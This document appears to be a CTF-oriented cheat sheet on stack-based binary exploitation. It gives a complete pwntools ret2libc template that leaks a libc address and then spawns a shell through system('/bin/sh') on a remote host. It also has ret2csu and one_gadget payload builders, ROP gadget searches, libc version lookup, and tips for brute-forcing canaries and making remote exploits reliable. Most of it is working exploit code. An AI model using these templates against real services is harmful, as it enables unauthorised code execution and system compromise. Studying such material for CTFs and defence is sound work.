# Stack pwn

## Trigger conditions and pre-checks

### Reading checksec

```bash
checksec --file=./vuln
# or pwntools
python -c "from pwn import *; print(ELF('./vuln'))"
```

| Field | Effect | Response |
|-------|--------|----------|
| `NX disabled` | Stack executable | Drop shellcode directly |
| `Canary found` | Stack overflow detected | MUST leak canary first or bypass (forked process / format string) |
| `PIE enabled` | .text base random | MUST leak a code address |
| `No PIE` | .text fixed | Hardcode gadget addresses |
| `Full RELRO` | GOT not writable | Cannot patch GOT; go ret2libc / one_gadget |
| `Partial RELRO` | GOT writable | Can patch GOT |
| `FORTIFY` | Some libc funcs replaced with `_chk` | `read_chk` can still overflow; `strcpy_chk` cannot |

### Precise overflow offset

```python
# pwntools cyclic
from pwn import *
context.arch = 'amd64'

# 1. Generate cyclic pattern
payload = cyclic(200)

# 2. Feed until crash
p = process('./vuln')
p.sendline(payload)
p.wait()

# 3. Read the value on RSP from the core dump
core = p.corefile
fault = core.fault_addr  # or 8 bytes pointed by core.rsp
offset = cyclic_find(fault & 0xffffffff)  # 32-bit mode
# 64-bit: cyclic_find(p64(fault)[:8])
log.info(f"offset = {offset}")
```

### 32 / 64-bit calling-convention cheat sheet

| Arch | Args | Return | Notes |
|------|------|--------|-------|
| x86 (32-bit) | Stack (cdecl: caller cleans) | eax | Stack: ret_addr, arg1, arg2, ... |
| x86-64 SysV | rdi, rsi, rdx, rcx, r8, r9, stack | rax | rsp MUST be 16-byte aligned at call entry |
| ARM32 | r0-r3, stack | r0 | lr holds return; bx lr returns |
| ARM64 | x0-x7, stack | x0 | Like SysV, stricter alignment |

## Full ret2libc pwntools template

```python
#!/usr/bin/env python3
from pwn import *

# === env ===
exe = './vuln'
libc_path = './libc.so.6'
HOST, PORT = 'chal.example.com', 31337

context.binary = elf = ELF(exe)
context.log_level = 'info'
libc = ELF(libc_path)

# auto patchelf so local uses the challenge libc
# patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . ./vuln

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug(exe, gdbscript='''
            b *main+123
            continue
        ''')
    return process(exe)

# === Stage 1: leak libc ===
p = conn()

OFFSET = 0x48  # from cyclic
pop_rdi = 0x0000000000401383  # ROPgadget --binary ./vuln --only "pop|ret" | grep rdi
ret     = 0x000000000040101a  # stack align

payload  = b'A' * OFFSET
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])     # puts prints puts@got
payload += p64(elf.plt['puts'])
payload += p64(elf.sym['main'])     # back to main for round 2

p.sendlineafter(b'> ', payload)

# recv leak (anchor with recvuntil; do not sleep)
p.recvuntil(b'bye\n')
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
log.success(f'leaked puts @ {hex(leak)}')

# reverse libc base
libc.address = leak - libc.sym['puts']
log.success(f'libc base = {hex(libc.address)}')

# === Stage 2: ret2libc system("/bin/sh") ===
binsh    = next(libc.search(b'/bin/sh\x00'))
system   = libc.sym['system']

payload  = b'A' * OFFSET
payload += p64(ret)        # critical: 16-byte align
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

p.sendlineafter(b'> ', payload)

p.interactive()
```

### Stack-align pit (MUST read)

```text
Symptom: local works; remote SIGSEGV as soon as system is entered
Cause: libc system → do_system → somewhere movaps xmm0, [rsp]
       requires rsp 16-byte aligned
Fail: when your ROP jumps into system, rsp ends in 0x8 not 0x0
Fix: insert a `ret` gadget in the ROP (consume 8 bytes; re-align rsp)
```

## ret2csu (universal gadget)

When the binary has no `pop rdx; ret` third-arg gadget, use the fixed structure in `__libc_csu_init` (present in glibc < 2.34 statically linked programs).

```text
__libc_csu_init tail fixed pattern:
    add  rsp, 8
    pop  rbx
    pop  rbp
    pop  r12
    pop  r13
    pop  r14
    pop  r15
    ret

Also in the middle:
    mov  rdx, r15  ; r15 → rdx
    mov  rsi, r14  ; r14 → rsi
    mov  edi, r13d ; r13 → rdi (low 32 bits)
    call qword ptr [r12 + rbx*8]
```

pwntools:

```python
csu_pop = 0x40119a  # first block (pop rbx..r15; ret)
csu_call = 0x401180  # second block (mov rdx,r15; ... ; call [r12+rbx*8])

def csu(rdi, rsi, rdx, call_target):
    p  = p64(csu_pop)
    p += p64(0)              # rbx = 0
    p += p64(1)              # rbp = 1 (so later cmp rbx,rbp passes → rbx+1 == rbp)
    p += p64(call_target)    # r12 = deref [r12+rbx*8] yields target
    p += p64(rdi)            # r13
    p += p64(rsi)            # r14
    p += p64(rdx)            # r15
    p += p64(csu_call)
    p += b'\x00' * 8 * 7     # second block rets then pops 7 more
    return p
```

Use: write a function pointer in bss, then csu-call it. Common after `read(0, bss, 0x100)` to jump into bss ROP.

## one_gadget

```bash
one_gadget ./libc.so.6

# output like:
# 0xe3afe execve("/bin/sh", r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe3b01 execve("/bin/sh", r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe3b04 execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
```

Use:

```python
og = [0xe3afe, 0xe3b01, 0xe3b04]
payload  = b'A' * OFFSET
payload += p64(ret)
payload += p64(libc.address + og[1])  # pick one whose constraints hold
```

**Pit**: on some libc versions (2.34+) one_gadget constraints are nearly impossible. Plain ret2libc is more stable.

## libc-database reverse lookup

Scene: challenge ships no libc; leak a few function addresses and infer the version.

```bash
cd ~/tools/libc-database

# reverse from leaked puts and read (last 3 hex digits)
./find puts 0x6f0 read 0xfd
# output: libc6_2.31-0ubuntu9.9_amd64

# dump all symbol offsets for that libc
./dump libc6_2.31-0ubuntu9.9_amd64

# download the actual libc.so.6
ls db/libc6_2.31-0ubuntu9.9_amd64.so
```

pwntools integration:

```python
# online libc-database query (no local DB)
from pwnlib.libcdb import search_by_symbol_offsets
libs = search_by_symbol_offsets({'puts': 0x6f0, 'read': 0xfd})
libc = ELF(libs[0])
```

## ROPgadget cheat sheet

```bash
# basic: pop|ret single reg
ROPgadget --binary ./vuln --only "pop|ret"

# find syscall
ROPgadget --binary ./vuln | grep ': syscall'

# find with specific bytes
ROPgadget --binary ./libc.so.6 --only "pop|ret" | grep 'pop rdi'

# find string
ROPgadget --binary ./libc.so.6 --string '/bin/sh'

# JSON for parsers
ROPgadget --binary ./vuln --json > gadgets.json
```

Ropper alternative (broader arch support):

```bash
ropper --file ./vuln --search "pop rdi; ret"
ropper --file ./libc.so.6 --search "syscall"
```

## Remote-stability checklist

| Problem | Symptom | Fix |
|---------|---------|-----|
| Wrong libc version | Local works, remote SIGSEGV in system | After leak, libc-database for the real version |
| Stack align | Instant segfault in system | Add a `ret` gadget |
| Network delay | recv gets a half packet | `recvuntil(b'anchor')`, not `sleep` |
| Buffering | sendline, no reaction | `sendlineafter`; wait for the prompt |
| ASLR jitter | Probabilistic success | Check if byte-level brute (1/16 is not stable) |
| TCP nagle | Small packets coalesce | `p.settimeout(2); p.recvall(timeout=2)` fallback |

## Debug tricks

```python
# pwntools embedded gdb attach
p = process('./vuln')
gdb.attach(p, '''
    b *main+0x123
    b *0x401234
    commands
        telescope $rsp 20
        continue
    end
''')

# start inside gdb
p = gdb.debug('./vuln', '''
    set follow-fork-mode child
    b main
''')
```

GEF/pwndbg common commands:

```text
checksec               # protections
vmmap                  # memory map
telescope $rsp 30      # stack chain (pwndbg)
stack 30               # similar (GEF)
got                    # GOT
search-pattern "/bin/sh"
context                # auto show reg + stack + code (on by default)
ropgadget              # built-in gadget search
```

## Notes

- **NX off + ASLR off** is required for direct shellcode; modern binaries almost always have NX
- **canary is unchanged in forked children** — forking servers can brute byte-by-byte (1/256 × 7 bytes)
- **Format string can leak canary and libc together** — `%p %p ... %p` stack scan
- **DynELF is slow but universal** — with no libc at all, pwntools `DynELF` leaks the symbol table byte-by-byte using the program's own IO primitives
- **Statically linked programs have no libc.got** — SROP (sigreturn-oriented programming) or raw syscall
